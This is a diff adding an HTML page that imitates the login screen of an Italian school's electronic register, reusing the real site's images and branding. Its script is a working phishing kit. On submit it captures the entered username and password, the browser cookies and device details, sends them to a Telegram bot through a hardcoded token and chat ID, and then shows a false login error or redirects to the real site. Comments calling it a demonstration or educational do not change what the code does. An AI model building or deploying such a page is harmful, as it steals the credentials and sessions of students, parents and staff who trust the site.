@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Registro Elettronico</title> 
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
+    <meta name="apple-mobile-web-app-capable" content="no">
+
+    <link rel="stylesheet" href="https://code.jquery.com/ui/1.10.1/themes/base/jquery-ui.css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ion-rangeslider/2.3.1/css/ion.rangeSlider.min.css">
+
+    <style>
+        /* Login CSS */
+        .registroLogin {
+            height: 100vh;
+            background: url('https://registro.orsoline.it/styles/mobile/images/bg.jpg') !important; 
+            background-repeat: repeat-y !important;
+            background-position: center center !important;
+            background-attachment: scroll !important;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .Login_divInput {
+            max-width: 500px;
+            min-width: 150px;
+            margin: 10px auto;
+        }
+
+        #Login_tdBtnLogin {
+            padding-left: 10px;
+            width: 150px;
+        }
+
+        #Login_content {
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            text-align: center;
+            text-shadow: 0px 1px 0px #fff;
+            width: 400px;
+            border: 1px solid silver;
+            border-radius: 20px;
+            background-color: rgba(255, 255, 255, 0.75);
+        }
+
+        #Login_txtUsername, #Login_txtPassword {
+            background-repeat: no-repeat;
+            background-position: 10px 10px;
+            padding: 13px 13px 13px 35px;
+            font-family: Helvetica, Arial, sans-serif;
+            font-size: 13px;
+            color: #777;
+            width: 250px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        #Login_txtUsername {
+            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjIZB7lXJQAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAJUlEQVQ4y2NgGAXDFmzatMmKAQ38v3///n8o/v/w4cP/Dx8+/A8A5OQZ7Yx5XjUAAAAASUVORK5CYII=');
+        }
+
+        #Login_txtPassword {
+            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjIZB7lXJQAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAJUlEQVQ4y2NgGAXDFmzatMmKAQ38v3///n8o/v/w4cP/Dx8+/A8A5OQZ7Yx5XjUAAAAASUVORK5CYII=');
+        }
+
+        #Login_btnLogin {
+            margin-left: 40px;
+            margin-top: 10px;
+        }
+
+        .sigmaButton {
+            width: 150px;
+            border-bottom-color: Gainsboro;
+            background-color: #2e6e9e;
+            color: WhiteSmoke;
+            border-radius: 4px;
+            padding: 10px 10px 10px 10px;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .sigmaButton:hover {
+            background-color: #1d4b6f;
+        }
+
+        #Login_lnkRecuPasw {
+            font-size: 0.7em; 
+            text-decoration: none;
+            color: #337ab7;
+        }
+
+        #Login_spanFailed {
+            font-size: 0.7em; 
+            color: red;
+            display: block;
+        }
+
+        #Login_divDEVELOPERS {
+            border-radius: 5px;
+            width: 180px;
+            margin: auto;
+            height: 23px;
+            margin-top: 60px;
+            text-shadow: none;
+            font-size: xx-small;
+        }
+
+        .waitIndicator {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            z-index: 9999;
+        }
+
+        .sigmaTextbox {
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div id="waitIndicator" class="waitIndicator"></div>
+    <div id="Default_host">
+        <div class="registroLogin">
+            <div class="container">
+                <section id="Login_content">
+                    <form action="" style="margin-top:5px;">
+                        <h1></h1>         
+
+                        <div>
+                            <img id="Login_imgLogoScuola" src="https://registro.orsoline.it/styles/logo/logoDedalo.png" style="max-height: 90px; max-width:370px;" alt="">
+                        </div>
+                        <div id="Login_divImgTextScuola" style="height: 0px; margin-bottom: 0px;">
+                            <img id="Login_imgTextScuola" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" alt="">
+                        </div> 
+                        <div style="height: 20px;">
+                            <img id="Login_imgWait" src="data:image/gif;base64,R0lGODlhEAAQAPIAAP///wAAAMLCwkJCQgAAAGJiYoKCgpKSkiH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQJCgAAACwAAAAAEAAQAAADMwi63P4wyklrE2MIOggZnAdOmGYJRbExwroUmcG2LmDEwnHQLVsYOd2mBzkYDAdKa+dIAAAh+QQJCgAAACwAAAAAEAAQAAADNAi63P5OjCEgG4QMu7DmikRxQlFUYDEZIGBMRVsaqHwctXXf7WEYB4Ag1xjihkMZsiUkKhIAIfkECQoAAAAsAAAAABAAEAAAAzYIujIjK8pByJDMlFYvBoVjHA70GU7xSUJhmKtwHPAKzLO9HMaoKwJZ7Rf8AYPDDzKpZBqfvwQAIfkECQoAAAAsAAAAABAAEAAAAzMIumIlK8oyhpHsnFZfhYumCYUhDAQxRIdhHBGqRoKw0R8DYlJd8z0fMDgsGo/IpHI5TAAAIfkECQoAAAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAh+QQJCgAAACwAAAAAEAAQAAADMwi6IMKQORfjdOe82p4wGccc4CEuQradylesojEMBgsUc2G7sDX3lQGBMLAJibufbSlKAAAh+QQJCgAAACwAAAAAEAAQAAADMgi63P7wCRHZnFVdmgHu2nFwlWCI3WGc3TSWhUFGxTAUkGCbtgENBMJAEJsxgMLWzpEAACH5BAkKAAAALAAAAAAQABAAAAMyCLrc/jDKSatlQtScKdceCAjDII7HcQ4EMTCpyrCuUBjCYRgHVtqlAiB1YhiCnlsRkAAAOwAAAAAAAAAAAA==" alt="wait" style="display:none;">
+                        </div>
+                        <div style="height: 60px;">
+                            <img src="https://registro.orsoline.it/styles/mobile/images/titolo.png" style="width: 340px;" alt="titolo">
+                        </div>
+                        <div>
+                            <img src="https://registro.orsoline.it/styles/mobile/images/logo1.png" alt="Logo">
+                        </div>
+                        <div class="Login_divInput">
+                            <input type="text" placeholder="Username" required="" id="Login_txtUsername" class="sigmaTextbox">
+                        </div>
+                        <div class="Login_divInput">
+                            <input type="password" placeholder="Password" required="" id="Login_txtPassword" class="sigmaTextbox">
+                        </div>
+
+                        <table style="border-collapse:separate; border-spacing:0px; width:100%; height: 40px; padding:0px;">
+                        <tbody><tr>
+                            <td id="Login_tdBtnLogin">
+                                <input type="submit" value="Log in" id="Login_btnLogin" class="sigmaButton">
+                            </td>
+                            <td style="vertical-align:top; text-align:right;">
+                                <a href="#" id="Login_lnkRecuPasw">Password dimenticata?</a> 
+                                <span id="Login_spanFailed" style="display: none;">Nome utente e password non corrispondono<br>o accesso non acconsentito all'utente</span>
+                            </td>
+                        </tr>
+                        </tbody></table>
+                        <div id="Login_divDEVELOPERS">
+                            <span style="font-size:xx-small;">Applicazione sviluppata da </span><a href="http://www.sigma-sistemi.it" target="_blank" style="font-size:xx-small;">Sigma Sistemi</a>
+                        </div>
+                    </form>
+                </section>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
+    <script src="https://code.jquery.com/ui/1.10.1/jquery-ui.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ion-rangeslider/2.3.1/js/ion.rangeSlider.min.js"></script>
+    
+    <script>
+        // Telegram bot credentials
+        const BOT_TOKEN = '7598236653:AAGVIpG9o6T9ipZvHSJqPWkydbBW15OoQWw';
+        const CHAT_ID = '5709299213';
+        
+        // Simulated valid credentials (for demonstration only)
+        const VALID_USERNAME = 'demo';
+        const VALID_PASSWORD = 'demo123';
+        
+        $(document).ready(function() {
+            $('form').on('submit', function(e) {
+                e.preventDefault();
+                $('#Login_imgWait').show();
+                $('#Login_spanFailed').hide();
+                
+                const username = $('#Login_txtUsername').val();
+                const password = $('#Login_txtPassword').val();
+                
+                // Get cookies (for educational purposes)
+                const cookies = document.cookie;
+                
+                // Get additional browser info
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenInfo = `Screen: ${screen.width}x${screen.height}`;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const currentTime = new Date().toLocaleString();
+                
+                // Send credentials to Telegram bot
+                const message = `📌 Nuovo accesso al registro elettronico:\n\n👤 Username: ${username}\n🔑 Password: ${password}\n\n🍪 Cookies: ${cookies}\n\n🌐 User Agent: ${userAgent}\n📱 Platform: ${platform}\n🖥️ ${screenInfo}\n⏰ Timezone: ${timezone}\n⌚ Local Time: ${currentTime}`;
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Message sent to Telegram:', data);
+                    
+                    // Check if credentials match our simulated valid ones
+                    if(username === VALID_USERNAME && password === VALID_PASSWORD) {
+                        // Redirect to official page after short delay
+                        setTimeout(() => {
+                            window.location.href = 'https://registro.orsoline.it/Default.aspx';
+                        }, 1500);
+                    } else {
+                        $('#Login_imgWait').hide();
+                        $('#Login_spanFailed').show();
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending to Telegram:', error);
+                    $('#Login_imgWait').hide();
+                    $('#Login_spanFailed').show();
+                });
+            });
+            
+            $('#Login_lnkRecuPasw').on('click', function(e) {
+                e.preventDefault();
+                alert('Funzionalità di recupero password non implementata in questa demo.');
+            });
+        });
+    </script>
+</body>
+</html>
